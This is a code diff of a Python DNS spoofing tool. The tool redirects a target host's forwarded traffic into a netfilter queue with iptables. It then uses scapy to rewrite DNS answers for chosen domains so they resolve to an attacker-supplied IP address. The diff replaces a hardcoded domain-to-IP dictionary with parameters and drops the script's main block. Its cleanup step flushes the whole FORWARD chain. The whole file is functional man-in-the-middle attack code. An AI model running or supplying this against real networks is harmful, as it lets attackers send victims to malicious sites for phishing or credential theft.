@@ -1,26 +1,28 @@
 import os
-import logging as log
-from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
  
- 
-class Spoof:
-    def __init__(self, dictionary, queueNum):
-        self.dictionary = dictionary
+class DNSSpoof:
+    def __init__(self, website, spoofIP, queueNum, targetIP):
+        self.website = website
+        self.spoofIP = spoofIP
         self.queueNum = queueNum
+        self.targetIP = targetIP
         self.queue = NetfilterQueue()
+        print self.website, self.spoofIP, self.targetIP
  
     def __call__(self):
         print("Spoofing....")
-        #{self.queueNum}
-        os.system('sudo iptables -I FORWARD -d 10.0.123.4 -j NFQUEUE --queue-num 1')
+        forward = 'sudo iptables -I FORWARD -d '
+        forward = forward + self.targetIP
+        forward = forward + ' -j NFQUEUE --queue-num 1'
+        os.system(forward)
         self.queue.bind(self.queueNum, self.poison)
         try:
             self.queue.run()
             print 'queue run: '
         except KeyboardInterrupt:
-            os.system('sudo iptables -D FORWARD -j NFQUEUE --queue-num 1')
+            os.system('sudo iptables -F FORWARD')
             print("[!] iptable rule flushed")
  
     def poison(self, packet):
@@ -28,37 +30,19 @@ class Spoof:
         if scapyPacket.haslayer(DNSRR):
             try:
                 queryName = scapyPacket[DNSQR].qname
-                if queryName in self.dictionary:
+                if queryName in self.website:
                     scapyPacket[DNS].an = DNSRR(
-                        rrname=queryName, rdata=self.dictionary[queryName])
+                        rrname=queryName, rdata=self.spoofIP)
                     scapyPacket[DNS].ancount = 1
                     del scapyPacket[IP].len
                     del scapyPacket[IP].chksum
                     del scapyPacket[UDP].len
                     del scapyPacket[UDP].chksum
-                    del scapyPacket[Ether].chksum
                     print "modified", queryName
                     packet.set_payload(bytes(scapyPacket))
                 else:
                     print("not modified")
+                return packet.accept()
             except IndexError as error:
-                log.error(error)
-            packet.set_payload(bytes(scapyPacket))
+                print "index error"
         return packet.accept()
- 
- 
-if __name__ == '__main__':
-    try:
-        #ip adresses that we want to spoof
-        dictionary = {
-            b"google.com.": "157.240.201.35",
-            b"www.google.com.": "157.240.201.35",
-            b"www.facebook.com.": "142.251.39.100",
-            b"facebook.com.": "142.251.39.100"
-        }
-        queueNum = 1
-        spoof = Spoof(dictionary, queueNum)
-        spoof()
-    except OSError as error:
-        log.error(error)
-
